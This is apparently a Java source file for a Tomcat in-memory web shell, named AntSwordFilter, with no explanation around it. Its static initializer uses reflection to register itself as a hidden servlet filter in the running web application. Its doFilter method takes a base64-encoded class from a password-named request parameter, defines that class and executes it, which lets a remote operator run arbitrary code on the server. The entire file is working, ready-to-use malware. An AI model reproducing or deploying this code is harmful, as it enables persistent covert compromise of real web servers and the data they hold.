package org.erosion2020.memshell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class AntSwordFilter extends ClassLoader implements Filter {

    public String cs = "UTF-8";
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;

    public AntSwordFilter() {
    }

    public AntSwordFilter(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception ignore) { }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])obj;
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception eChild) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception ignore) { }
                    }
                }
            }
        }
    }

    public static String name;
    public static String pattern;
    public static String password;

    static {
        try {
            final String urlPattern = pattern;

            WebappClassLoaderBase loader =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) loader.getResources().getContext();

            Field filterConfigsField = findField(context.getClass(), "filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, ApplicationFilterConfig> filterConfigs =
                    (Map<String, ApplicationFilterConfig>) filterConfigsField.get(context);

            // 创建 Filter 对象和 FilterDef
            AntSwordFilter filter = new AntSwordFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            context.addFilterDef(filterDef);

            // 添加 Filter 映射
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(urlPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMapBefore(filterMap);

            // 构造 ApplicationFilterConfig 对象并注册
            Constructor<ApplicationFilterConfig> constructor =
                    ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig config = constructor.newInstance(context, filterDef);
            filterConfigs.put(name, config);

        } catch (Exception ignore) { }
    }
    private static Field findField(Class<?> clazz, String name) throws NoSuchFieldException {
        while (clazz != null) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException("Field " + name + " not found.");
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest)servletRequest;
        HttpServletResponse res = (HttpServletResponse)servletResponse;
        String cls = req.getParameter(password);
        if (cls != null) {
            try {
                (new AntSwordFilter(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{req, res});
            } catch (Exception ignore) { }
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64=Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception e) {
            try {
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception ee) {}
        }
        return value;
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }
}
